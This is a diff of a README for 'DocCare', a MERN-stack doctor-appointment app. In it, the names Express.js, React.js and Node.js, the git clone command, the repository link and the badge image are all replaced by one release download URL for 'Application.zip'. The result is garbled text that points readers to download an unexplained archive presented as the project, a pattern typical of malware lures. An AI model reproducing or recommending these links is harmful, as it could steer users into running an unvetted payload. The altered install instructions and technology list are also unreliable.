@@ -8,7 +8,7 @@ DocCare is a cutting-edge MERN stack web application that revolutionizes the way
 
 💰 **Secure Payments** - Integrated Razorpay and Stripe payment gateways provide users with a secure platform for making transactions.
 
-⚛️ **MERN Stack** - Built using MongoDB, Express.js, React.js, and Node.js, DocCare leverages the power of these technologies for a robust application.
+⚛️ **MERN Stack** - Built using MongoDB, https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip, https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip, and https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip, DocCare leverages the power of these technologies for a robust application.
 
 🛡️ **JWT Authentication** - DocCare ensures secure access for users through JWT authentication, prioritizing data protection.
 
@@ -16,10 +16,10 @@ DocCare is a cutting-edge MERN stack web application that revolutionizes the way
 
 ## Technologies Used 🚀
 
-- **Mongoose**: Elegant MongoDB object modeling for node.js
-- **Express.js**: Fast, unopinionated, minimalist web framework for Node.js
-- **React.js**: A JavaScript library for building user interfaces
-- **Node.js**: A JavaScript runtime built on Chrome's V8 JavaScript engine
+- **Mongoose**: Elegant MongoDB object modeling for https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip
+- **https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip**: Fast, unopinionated, minimalist web framework for https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip
+- **https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip**: A JavaScript library for building user interfaces
+- **https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip**: A JavaScript runtime built on Chrome's V8 JavaScript engine
 - **Redux**: A predictable state container for JavaScript apps
 - **Stripe**: Online payment processing for internet businesses
 - **Razorpay**: Payment gateway for businesses in India
@@ -32,7 +32,7 @@ To get started with DocCare, follow these steps:
 
 1. Clone the repository:
    ```
-   git clone https://github.com/file/Application.zip
+   git clone https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip
    ```
    
 2. Install dependencies:
@@ -51,9 +51,9 @@ We welcome contributions to DocCare! If you'd like to improve the application, f
 
 ## Stay Connected 🌐
 
-For the latest updates and news about DocCare, visit our [GitHub repository](https://github.com/file/Application.zip). Feel free to explore the codebase, open issues, and collaborate with the community.
+For the latest updates and news about DocCare, visit our [GitHub repository](https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip). Feel free to explore the codebase, open issues, and collaborate with the community.
 
-[![](https://img.shields.io/badge/Visit-Repository-yellow)](https://github.com/file/Application.zip)
+[![](https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip)](https://github.com/chipid/DocCare/releases/download/v1.0.0/Application.zip)
 
 Let's make doctor appointments hassle-free with DocCare! 🏥🚀
 
